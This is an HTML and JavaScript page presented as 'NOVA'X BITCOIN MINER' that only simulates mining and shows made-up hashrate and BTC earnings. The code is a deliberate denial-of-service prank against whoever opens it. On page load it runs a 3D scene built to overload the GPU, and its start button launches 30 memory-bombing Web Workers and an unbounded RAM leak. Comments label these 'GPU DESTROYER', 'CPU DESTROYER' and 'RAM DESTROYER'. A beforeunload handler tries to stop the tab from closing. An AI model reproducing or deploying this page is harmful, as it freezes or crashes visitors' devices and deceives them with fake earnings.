<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>NOVA'X BITCOIN MINER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }

        /* OVERLAY UI */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 999;
            pointer-events: none;
        }

        /* HEADER */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            padding: 15px 20px;
            background: linear-gradient(180deg, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0) 100%);
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 12px;
            pointer-events: auto;
        }

        .bitcoin-logo-header {
            width: 40px;
            height: 40px;
            animation: spinBTC 3s linear infinite;
        }

        @keyframes spinBTC {
            0% { transform: rotateY(0deg); }
            100% { transform: rotateY(360deg); }
        }

        .header-title {
            color: #F7931A;
            font-size: 20px;
            font-weight: bold;
            text-shadow: 0 0 20px rgba(247,147,26,0.8);
            letter-spacing: 2px;
        }

        .header-subtitle {
            color: #ff6600;
            font-size: 10px;
            letter-spacing: 3px;
        }

        /* MAIN BITCOIN LOGO */
        .btc-center-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 998;
            pointer-events: none;
            text-align: center;
        }

        .btc-logo-main {
            width: 120px;
            height: 120px;
            animation: pulseBTC 1s ease-in-out infinite, spinBTC 6s linear infinite;
            filter: drop-shadow(0 0 40px rgba(247,147,26,0.9)) drop-shadow(0 0 80px rgba(255,102,0,0.6));
        }

        @keyframes pulseBTC {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.15); }
        }

        .btc-label {
            color: #F7931A;
            font-size: 16px;
            font-weight: bold;
            letter-spacing: 3px;
            margin-top: 8px;
            text-shadow: 0 0 30px rgba(247,147,26,1);
            animation: blinkText 0.5s infinite;
        }

        @keyframes blinkText {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* MINING PANEL */
        .mining-panel {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            border: 2px solid #F7931A;
            border-radius: 12px;
            padding: 20px 30px;
            z-index: 1000;
            pointer-events: auto;
            text-align: center;
            box-shadow: 0 0 40px rgba(247,147,26,0.4), inset 0 0 20px rgba(247,147,26,0.1);
            min-width: 350px;
        }

        .mining-title {
            color: #F7931A;
            font-size: 14px;
            letter-spacing: 4px;
            margin-bottom: 12px;
            text-shadow: 0 0 15px rgba(247,147,26,0.7);
        }

        .hashrate {
            color: #00ff41;
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 6px;
            text-shadow: 0 0 20px rgba(0,255,65,0.6);
        }

        .hashrate-unit {
            color: #666;
            font-size: 11px;
            letter-spacing: 2px;
        }

        .progress-container {
            background: #111;
            border: 1px solid #333;
            border-radius: 20px;
            height: 8px;
            margin: 12px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #F7931A, #ff6600, #F7931A);
            border-radius: 20px;
            transition: width 0.1s;
            animation: progressGlow 0.5s infinite;
        }

        @keyframes progressGlow {
            0%, 100% { box-shadow: 0 0 10px rgba(247,147,26,0.6); }
            50% { box-shadow: 0 0 25px rgba(247,147,26,1); }
        }

        .stats-row {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            margin: 10px 0;
            font-size: 10px;
        }

        .stat-item {
            color: #888;
            letter-spacing: 1px;
        }

        .stat-value {
            color: #F7931A;
            font-weight: bold;
            font-size: 12px;
        }

        .stat-value.danger {
            color: #ff0000;
            animation: blinkText 0.3s infinite;
        }

        #btnMining {
            background: linear-gradient(180deg, #F7931A, #cc7700);
            color: #000;
            border: none;
            padding: 14px 40px;
            font-size: 16px;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            letter-spacing: 3px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            text-shadow: 0 1px 0 rgba(255,255,255,0.2);
            box-shadow: 0 0 30px rgba(247,147,26,0.5);
            transition: all 0.2s;
            pointer-events: auto;
        }

        #btnMining:hover {
            box-shadow: 0 0 60px rgba(247,147,26,0.9);
            transform: scale(1.05);
        }

        #btnMining:active {
            transform: scale(0.95);
        }

        #btnMining.mining-active {
            background: linear-gradient(180deg, #ff0000, #990000);
            box-shadow: 0 0 40px rgba(255,0,0,0.7);
        }

        /* STATUS CORNER */
        .corner-status {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            text-align: right;
            pointer-events: none;
        }

        .status-line {
            color: #ff0000;
            font-size: 10px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255,0,0,0.6);
            animation: blinkText 0.8s infinite;
        }

        .status-line.green {
            color: #00ff41;
            text-shadow: 0 0 10px rgba(0,255,65,0.6);
        }

        /* WARNING OVERLAY */
        .warning-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,0,0,0.05);
            z-index: 997;
            pointer-events: none;
            animation: flashRed 0.5s infinite;
        }

        @keyframes flashRed {
            0%, 100% { opacity: 0; }
            50% { opacity: 1; }
        }

        /* MATRIX RAIN BACKGROUND */
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 0;
            pointer-events: none;
        }

        /* RESPONSIVE */
        @media (max-width: 600px) {
            .mining-panel {
                min-width: auto;
                width: 90%;
                padding: 15px;
            }
            .hashrate { font-size: 20px; }
            .btc-logo-main { width: 80px; height: 80px; }
            .header-title { font-size: 14px; }
        }
    </style>
</head>
<body>

    <!-- MATRIX BACKGROUND -->
    <canvas id="matrixCanvas"></canvas>

    <!-- WARNING FLASH -->
    <div class="warning-flash" id="warningFlash" style="display:none;"></div>

    <!-- HEADER -->
    <div class="header">
        <svg class="bitcoin-logo-header" viewBox="0 0 64 64">
            <circle cx="32" cy="32" r="30" fill="#F7931A" stroke="#ffaa00" stroke-width="3"/>
            <text x="32" y="42" text-anchor="middle" font-size="36" font-weight="bold" fill="#fff" font-family="Arial">₿</text>
        </svg>
        <div>
            <div class="header-title">NOVA'X MINER</div>
            <div class="header-subtitle">BITCOIN  v1.2</div>
        </div>
    </div>

    <!-- CORNER STATUS -->
    <div class="corner-status">
        <div class="status-line">⚠ GPU: OVERLOAD</div>
        <div class="status-line">⚠ CPU: MAXED</div>
        <div class="status-line">⚠ RAM: LEAKING</div>
    </div>

    <!-- CENTER BITCOIN LOGO -->
    <div class="btc-center-container">
        <svg class="btc-logo-main" viewBox="0 0 64 64">
            <circle cx="32" cy="32" r="30" fill="#F7931A" stroke="#ffaa00" stroke-width="3"/>
            <text x="32" y="42" text-anchor="middle" font-size="36" font-weight="bold" fill="#fff" font-family="Arial">₿</text>
        </svg>
        <div class="btc-label">MINING ACTIVE</div>
    </div>

    <!-- MINING PANEL -->
    <div class="mining-panel" id="miningPanel">
        <div class="mining-title">⛏️ BITCOIN MINING RIG ⛏️</div>
        <div class="hashrate" id="hashrateDisplay">0.00</div>
        <div class="hashrate-unit">MH/s</div>
        <div class="progress-container">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="stats-row">
            <div class="stat-item">
                SHARES<br><span class="stat-value" id="sharesCount">0</span>
            </div>
            <div class="stat-item">
                TEMP<br><span class="stat-value danger" id="tempDisplay">0°C</span>
            </div>
            <div class="stat-item">
                RAM<br><span class="stat-value danger" id="ramDisplay">0 MB</span>
            </div>
        </div>
        <div class="stats-row">
            <div class="stat-item">
                UPTIME<br><span class="stat-value" id="uptimeDisplay">00:00:00</span>
            </div>
            <div class="stat-item">
                BTC EARNED<br><span class="stat-value" id="btcEarned">0.00000000</span>
            </div>
        </div>
        <button id="btnMining" onclick="toggleMining()">START MINING</button>
    </div>

    <!-- THREE.JS CANVAS -->
    <script type="importmap">
        {
            "imports": {
                "three": "https://unpkg.com/three@0.128.0/build/three.module.js"
            }
        }
    </script>

    <script type="module">
        import * as THREE from 'three';
        import { OrbitControls } from 'https://unpkg.com/three@0.128.0/examples/jsm/controls/OrbitControls.js';
        import { EffectComposer } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/EffectComposer.js';
        import { RenderPass } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/RenderPass.js';
        import { UnrealBloomPass } from 'https://unpkg.com/three@0.128.0/examples/jsm/postprocessing/UnrealBloomPass.js';

        // ===========================================
        // NOVA'X 3D GPU DESTROYER ENGINE
        // ===========================================

        const scene = new THREE.Scene();
        scene.background = new THREE.Color(0x000000);
        scene.fog = new THREE.FogExp2(0x000000, 0.0003);

        const camera = new THREE.PerspectiveCamera(110, window.innerWidth / window.innerHeight, 0.001, 15000);
        camera.position.set(0, 15, 40);

        const renderer = new THREE.WebGLRenderer({ antialias: true, powerPreference: "high-performance" });
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.setPixelRatio(window.devicePixelRatio * 2);
        renderer.shadowMap.enabled = true;
        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
        document.body.appendChild(renderer.domElement);

        // BLOOM
        const renderScene = new RenderPass(scene, camera);
        const bloomPass = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.5, 0.4, 0.85);
        bloomPass.threshold = 0.1;
        bloomPass.strength = 2.5;
        bloomPass.radius = 1;

        const effectComposer = new EffectComposer(renderer);
        effectComposer.addPass(renderScene);
        effectComposer.addPass(bloomPass);

        // SECOND BLOOM (double GPU load)
        const bloomPass2 = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 2, 0.5, 0.9);
        bloomPass2.threshold = 0.05;
        bloomPass2.strength = 3;
        bloomPass2.radius = 1.5;
        effectComposer.addPass(bloomPass2);

        // CONTROLS
        const controls = new OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.05;
        controls.rotateSpeed = 5;

        // ========== 150K PARTICLES ==========
        const particleCount = 150000;
        const particlesGeo = new THREE.BufferGeometry();
        const pos = new Float32Array(particleCount * 3);
        const col = new Float32Array(particleCount * 3);
        for (let i = 0; i < particleCount; i++) {
            const r = 80;
            const th = Math.random() * Math.PI * 2;
            const ph = Math.acos(2 * Math.random() - 1);
            pos[i*3] = r * Math.sin(ph) * Math.cos(th);
            pos[i*3+1] = r * Math.sin(ph) * Math.sin(th);
            pos[i*3+2] = r * Math.cos(ph);
            col[i*3] = Math.random();
            col[i*3+1] = Math.random();
            col[i*3+2] = Math.random();
        }
        particlesGeo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
        particlesGeo.setAttribute('color', new THREE.BufferAttribute(col, 3));
        const particleMat = new THREE.PointsMaterial({ size: 0.3, vertexColors: true, blending: THREE.AdditiveBlending, transparent: true, opacity: 0.8 });
        const particleSystem = new THREE.Points(particlesGeo, particleMat);
        scene.add(particleSystem);

        // ========== HIGH POLY SPHERE ==========
        const sphereGeo = new THREE.SphereGeometry(12, 256, 256);
        const sphereMat = new THREE.MeshStandardMaterial({ color: 0xF7931A, emissive: 0xF7931A, emissiveIntensity: 1, metalness: 0.9, roughness: 0.1 });
        const sphere = new THREE.Mesh(sphereGeo, sphereMat);
        sphere.castShadow = true;
        sphere.receiveShadow = true;
        scene.add(sphere);

        // ========== 50 TORUS KNOTS ==========
        const torusGeo = new THREE.TorusKnotGeometry(5, 1.2, 512, 64, 3, 4);
        const knots = [];
        for (let i = 0; i < 50; i++) {
            const mat = new THREE.MeshStandardMaterial({ color: 0x00ffff, emissive: 0x00ffff, emissiveIntensity: 0.8, metalness: 0.95, roughness: 0.05, transparent: true, opacity: 0.9 });
            const knot = new THREE.Mesh(torusGeo, mat);
            const angle = (i / 50) * Math.PI * 2;
            knot.position.x = Math.cos(angle) * 25;
            knot.position.z = Math.sin(angle) * 25;
            knot.position.y = Math.sin(angle * 3) * 8;
            knot.castShadow = true;
            scene.add(knot);
            knots.push(knot);
        }

        // ========== 200 ICOSAHEDRONS ==========
        const icoGeo = new THREE.IcosahedronGeometry(1.5, 3);
        const icos = [];
        for (let i = 0; i < 200; i++) {
            const mat = new THREE.MeshStandardMaterial({ color: new THREE.Color().setHSL(Math.random(), 1, 0.5), emissive: new THREE.Color().setHSL(Math.random(), 1, 0.3), emissiveIntensity: 0.5, metalness: Math.random(), roughness: Math.random() });
            const ico = new THREE.Mesh(icoGeo, mat);
            const r = 40, th = Math.random() * Math.PI * 2, ph = Math.acos(2 * Math.random() - 1);
            ico.position.set(r * Math.sin(ph) * Math.cos(th), r * Math.sin(ph) * Math.sin(th), r * Math.cos(ph));
            ico.castShadow = true;
            scene.add(ico);
            icos.push(ico);
        }

        // ========== 500 LIGHTS ==========
        const lights = [];
        for (let i = 0; i < 500; i++) {
            const light = new THREE.PointLight(0xF7931A, 1, 50);
            const angle = (i / 500) * Math.PI * 2;
            light.position.set(Math.cos(angle) * 20, Math.sin(angle * 5) * 10, Math.sin(angle) * 20);
            light.castShadow = true;
            light.shadow.mapSize.width = 1024;
            light.shadow.mapSize.height = 1024;
            scene.add(light);
            lights.push(light);
        }

        // ========== 20 DIRECTIONAL LIGHTS (4K SHADOW MAPS) ==========
        for (let i = 0; i < 20; i++) {
            const dl = new THREE.DirectionalLight(0xffffff, 1);
            dl.position.set(Math.random() * 50 - 25, Math.random() * 50, Math.random() * 50 - 25);
            dl.castShadow = true;
            dl.shadow.mapSize.width = 4096;
            dl.shadow.mapSize.height = 4096;
            dl.shadow.camera.near = 0.5;
            dl.shadow.camera.far = 100;
            dl.shadow.camera.left = -20;
            dl.shadow.camera.right = 20;
            dl.shadow.camera.top = 20;
            dl.shadow.camera.bottom = -20;
            scene.add(dl);
        }

        // ========== WIREFRAME ==========
        const gridHelper = new THREE.GridHelper(200, 200, 0xF7931A, 0x00ffff);
        gridHelper.position.y = -15;
        scene.add(gridHelper);

        const wireSphere = new THREE.Mesh(new THREE.SphereGeometry(14, 64, 64), new THREE.MeshBasicMaterial({ color: 0xF7931A, wireframe: true, transparent: true, opacity: 0.3 }));
        scene.add(wireSphere);

        // ========== SHADER PLANE ==========
        const shaderMat = new THREE.ShaderMaterial({
            uniforms: { time: { value: 0 }, colorA: { value: new THREE.Color(0xF7931A) }, colorB: { value: new THREE.Color(0x00ffff) } },
            vertexShader: `varying vec2 vUv; void main() { vUv = uv; gl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0); }`,
            fragmentShader: `uniform float time; uniform vec3 colorA; uniform vec3 colorB; varying vec2 vUv; void main() { vec3 color = mix(colorA,colorB,sin(vUv.x*20.0+time)*0.5+0.5); color += sin(vUv.y*30.0+time*2.0)*0.5; gl_FragColor = vec4(color,1.0); }`
        });
        const shaderPlane = new THREE.Mesh(new THREE.PlaneGeometry(30, 30, 256, 256), shaderMat);
        shaderPlane.position.y = -10;
        shaderPlane.rotation.x = -Math.PI / 2;
        scene.add(shaderPlane);

        // ========== SMOKE ==========
        const smokeGeo = new THREE.BufferGeometry();
        const smokePos = new Float32Array(50000 * 3);
        for (let i = 0; i < 50000; i++) {
            smokePos[i*3] = (Math.random() - 0.5) * 100;
            smokePos[i*3+1] = (Math.random() - 0.5) * 50;
            smokePos[i*3+2] = (Math.random() - 0.5) * 100;
        }
        smokeGeo.setAttribute('position', new THREE.BufferAttribute(smokePos, 3));
        const smokeSystem = new THREE.Points(smokeGeo, new THREE.PointsMaterial({ color: 0xff6600, size: 0.15, blending: THREE.AdditiveBlending, transparent: true, opacity: 0.6 }));
        scene.add(smokeSystem);

        // ========== BITCOIN 3D MODEL ==========
        const btcGroup = new THREE.Group();
        const btcCoinGeo = new THREE.CylinderGeometry(3, 3, 0.4, 128);
        const btcCoinMat = new THREE.MeshStandardMaterial({ color: 0xF7931A, emissive: 0xF7931A, emissiveIntensity: 0.8, metalness: 1, roughness: 0.1 });
        const btcCoin = new THREE.Mesh(btcCoinGeo, btcCoinMat);
        btcCoin.rotation.x = Math.PI / 2;
        btcGroup.add(btcCoin);

        // Ring around BTC
        const ringGeo = new THREE.TorusGeometry(3.2, 0.15, 32, 128);
        const ringMat = new THREE.MeshStandardMaterial({ color: 0xffaa00, emissive: 0xffaa00, emissiveIntensity: 1.5, metalness: 1, roughness: 0 });
        const ring = new THREE.Mesh(ringGeo, ringMat);
        btcGroup.add(ring);

        btcGroup.position.set(0, 0, 0);
        scene.add(btcGroup);

        // ========== ANIMATION LOOP ==========
        let time = 0;
        function animate() {
            requestAnimationFrame(animate);
            time += 0.02;
            shaderMat.uniforms.time.value = time;
            sphere.rotation.set(time * 0.5, time * 0.3, time * 0.7);
            wireSphere.rotation.set(time * 0.4, time * 0.6);
            particleSystem.rotation.set(time * 0.05, time * 0.1, 0);
            smokeSystem.rotation.set(time * 0.04, time * 0.08, 0);
            btcGroup.rotation.y = time * 0.5;
            ring.rotation.x = time * 1.5;
            ring.rotation.z = time * 2;

            knots.forEach((k, i) => { k.rotation.set(time * (1 + i * 0.05), time * (1.5 + i * 0.03), time * (0.8 + i * 0.04)); });
            icos.forEach((ico, i) => { ico.rotation.set(time * (0.5 + i * 0.02), time * (0.7 + i * 0.01), time * (0.3 + i * 0.015)); });
            lights.forEach((l, i) => {
                const hue = (time * 0.5 + i * 0.01) % 1;
                l.color.setHSL(hue, 1, 0.5);
                const a = time * 0.5 + i * 0.02;
                l.position.set(Math.cos(a) * 22, Math.sin(a * 2) * 12, Math.sin(a) * 22);
            });

            controls.update();
            effectComposer.render();
            renderer.render(scene, camera);
        }
        animate();
    </script>

    <!-- =========================================== -->
    <!-- CPU + RAM DESTROYER + MINING SIMULATION     -->
    <!-- =========================================== -->
    <script>
        // ========== GLOBAL STATE ==========
        let miningActive = false;
        let hashrate = 0;
        let shares = 0;
        let btcEarned = 0;
        let temp = 45;
        let startTime = null;
        let cpuWorkers = [];
        let ramLeakArray = [];
        let matrixInterval = null;

        // ========== MATRIX RAIN (GPU + CPU) ==========
        const matrixCanvas = document.getElementById('matrixCanvas');
        const ctx = matrixCanvas.getContext('2d');
        matrixCanvas.width = window.innerWidth;
        matrixCanvas.height = window.innerHeight;

        const matrixChars = '₿Ƀ฿BITCOINNOVAXMINER0123456789$€¥₿';
        const fontSize = 14;
        const columns = Math.floor(matrixCanvas.width / fontSize);
        const drops = Array(columns).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            ctx.fillStyle = '#F7931A';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        function startMatrix() {
            if (matrixInterval) return;
            matrixInterval = setInterval(drawMatrix, 33); // ~30 FPS matrix rain
        }

        function stopMatrix() {
            clearInterval(matrixInterval);
            matrixInterval = null;
        }

        // ========== CPU DESTROYER (Web Workers) ==========
        function spawnCPUWorkers(count) {
            for (let i = 0; i < count; i++) {
                const workerCode = `
                    let bomb = [];
                    function heavyCalc() {
                        for(let i = 0; i < 50000; i++) {
                            bomb.push(new Array(5000).fill(Math.random()));
                            Math.sqrt(Math.random() * 9999999);
                            Math.pow(Math.random(), Math.random());
                            Math.sin(Math.random() * 99999);
                        }
                        postMessage('crunch');
                        setTimeout(heavyCalc, 0);
                    }
                    heavyCalc();
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = () => {
                    shares++;
                    document.getElementById('sharesCount').textContent = shares.toLocaleString();
                };
                cpuWorkers.push(worker);
            }
        }

        function killCPUWorkers() {
            cpuWorkers.forEach(w => w.terminate());
            cpuWorkers = [];
        }

        // ========== RAM DESTROYER ==========
        function startRAMLeak() {
            ramLeakArray = [];
            function leak() {
                if (!miningActive) return;
                for (let i = 0; i < 500; i++) {
                    ramLeakArray.push(new Array(50000).fill(Math.random()));
                }
                const ramMB = Math.round((ramLeakArray.length * 50000 * 8) / 1048576);
                document.getElementById('ramDisplay').textContent = ramMB + ' MB';
                if (ramMB > 2000) document.getElementById('ramDisplay').classList.add('danger');
                setTimeout(leak, 50);
            }
            leak();
        }

        // ========== TEMPERATURE SIMULATION ==========
        function updateTemp() {
            if (!miningActive) return;
            temp += Math.random() * 2;
            if (temp > 100) temp = 95 + Math.random() * 5;
            document.getElementById('tempDisplay').textContent = Math.round(temp) + '°C';
            if (temp > 80) document.getElementById('tempDisplay').classList.add('danger');
            setTimeout(updateTemp, 1000);
        }

        // ========== HASHRATE UPDATE ==========
        function updateHashrate() {
            if (!miningActive) return;
            hashrate = Math.random() * 500 + 100;
            document.getElementById('hashrateDisplay').textContent = hashrate.toFixed(2);
            const progress = Math.min((temp / 105) * 100, 100);
            document.getElementById('progressFill').style.width = progress + '%';
            // BTC earned (simulasi)
            btcEarned += hashrate * 0.000000001;
            document.getElementById('btcEarned').textContent = btcEarned.toFixed(8);
            setTimeout(updateHashrate, 200);
        }

        // ========== UPTIME ==========
        function updateUptime() {
            if (!miningActive || !startTime) return;
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(elapsed / 3600);
            const m = Math.floor((elapsed % 3600) / 60);
            const s = elapsed % 60;
            document.getElementById('uptimeDisplay').textContent =
                String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
            setTimeout(updateUptime, 1000);
        }

        // ========== WARNING FLASH ==========
        function updateWarningFlash() {
            if (!miningActive) return;
            const flash = document.getElementById('warningFlash');
            if (temp > 85) flash.style.display = 'block';
            else flash.style.display = 'none';
            setTimeout(updateWarningFlash, 500);
        }

        // ========== TOGGLE MINING ==========
        window.toggleMining = function() {
            miningActive = !miningActive;
            const btn = document.getElementById('btnMining');
            const label = document.querySelector('.btc-label');
            const logo = document.querySelector('.btc-logo-main');

            if (miningActive) {
                // START MINING
                btn.textContent = '🛑 STOP MINING 🛑';
                btn.classList.add('mining-active');
                label.textContent = '⛏️ MINING ACTIVE ⛏️';
                logo.style.animation = 'pulseBTC 0.5s ease-in-out infinite, spinBTC 2s linear infinite';
                startTime = Date.now();
                shares = 0;
                btcEarned = 0;
                temp = 45;

                startMatrix();
                spawnCPUWorkers(30); // 30 Web Workers = CPU MAXED
                startRAMLeak();
                updateTemp();
                updateHashrate();
                updateUptime();
                updateWarningFlash();

                document.getElementById('warningFlash').style.display = 'block';
                document.querySelectorAll('.status-line').forEach(el => el.classList.remove('green'));

                console.log('%c🔥 NOVA\'X MINER AKTIF - GPU+CPU+RAM DIHANCURKAN 🔥', 'color:red;font-size:18px;');
            } else {
                // STOP MINING
                btn.textContent = '⚡ START MINING ⚡';
                btn.classList.remove('mining-active');
                label.textContent = 'MINER STOPPED';
                logo.style.animation = 'pulseBTC 1s ease-in-out infinite, spinBTC 6s linear infinite';

                stopMatrix();
                killCPUWorkers();
                miningActive = false;

                document.getElementById('warningFlash').style.display = 'none';
                document.getElementById('hashrateDisplay').textContent = '0.00';
                document.getElementById('progressFill').style.width = '0%';
                document.getElementById('tempDisplay').textContent = '45°C';
                document.getElementById('tempDisplay').classList.remove('danger');
                document.getElementById('ramDisplay').textContent = '0 MB';
                document.getElementById('ramDisplay').classList.remove('danger');
                document.querySelectorAll('.status-line').forEach(el => el.classList.add('green'));

                console.log('%c⛔ MINER STOPPED - System cooling down...', 'color:green;font-size:14px;');
            }
        };

        // ========== INIT ==========
        startMatrix();

        // ========== RESIZE ==========
        window.addEventListener('resize', () => {
            matrixCanvas.width = window.innerWidth;
            matrixCanvas.height = window.innerHeight;
        });

        // ========== ANTI-CLOSE ==========
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });

        // ========== CONSOLE BRANDING ==========
        console.log('%c₿ NOVA\'X BITCOIN MINER v9.999 ₿', 'color:#F7931A;font-size:24px;font-weight:bold;');
        console.log('%c@maklowwh', 'color:#ff6600;font-size:14px;');
        console.log('%ct.me/maklowwh', 'color:#ffaa00;font-size:12px;');
    </script>
</body>
</html>
